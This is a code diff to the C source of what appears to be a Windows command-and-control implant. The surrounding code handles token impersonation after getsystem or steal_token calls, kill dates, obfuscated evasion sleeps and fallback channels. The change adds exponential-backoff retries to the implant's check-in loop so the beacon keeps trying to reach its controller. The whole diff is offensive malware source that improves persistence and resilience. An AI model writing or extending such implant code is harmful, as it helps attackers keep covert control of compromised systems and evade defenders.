@@ -43,7 +43,7 @@ static void capture_thread_token(AgentState *state) {
     if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                         FALSE, &hThreadToken)) {
         /* Thread IS impersonating — store it if we don't already have one,
-           or if it's a different token (new getsystem/tokenmanip call). */
+           or if it's a different token (new getsystem/steal_token call). */
         if (state->impersonation_token == NULL) {
             HANDLE hDup = NULL;
             if (DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL,
@@ -703,6 +703,8 @@ BOOL agent_checkin(AgentState *state) {
 /* ─── Main loop ─── */
 
 void agent_run(AgentState *state) {
+    int consecutive_checkin_failures = 0;
+
     while (state->running) {
         /* Kill date check */
         if (CONFIG_KILL_DATE > 0) {
@@ -715,10 +717,29 @@ void agent_run(AgentState *state) {
 
         /* Check in (with channel fallback on failure) */
         if (!agent_checkin(state)) {
-            if (!channel_try_fallback()) {
-                /* All channels exhausted — extended sleep */
-                evasion_sleep_obfuscated(3600000); /* 1 hour */
+            consecutive_checkin_failures++;
+            DBG("[run] checkin FAILED (%d consecutive)", consecutive_checkin_failures);
+
+            if (consecutive_checkin_failures < CONFIG_CHANNEL_MAX_FAILURES) {
+                /* Retry with increasing backoff: 2x, 4x, 8x, 16x normal sleep */
+                int backoff_ms = state->sleep_ms * (1 << consecutive_checkin_failures);
+                if (backoff_ms > 300000) backoff_ms = 300000; /* Cap at 5 minutes */
+                DBG("[run] retry backoff %d ms", backoff_ms);
+                evasion_sleep_obfuscated((DWORD)backoff_ms);
+                continue;  /* Retry immediately (skip normal sleep) */
             }
+
+            /* Exhausted retries — try channel fallback */
+            if (!channel_try_fallback()) {
+                /* All channels exhausted — extended sleep, then reset retries */
+                DBG("[run] all channels exhausted, sleeping 1 hour");
+                evasion_sleep_obfuscated(3600000); /* 1 hour */
+                consecutive_checkin_failures = 0;  /* Reset to try again */
+                continue;
+            }
+            consecutive_checkin_failures = 0;
+        } else {
+            consecutive_checkin_failures = 0;
         }
 
         /* Exit immediately if checkin received EXIT task */
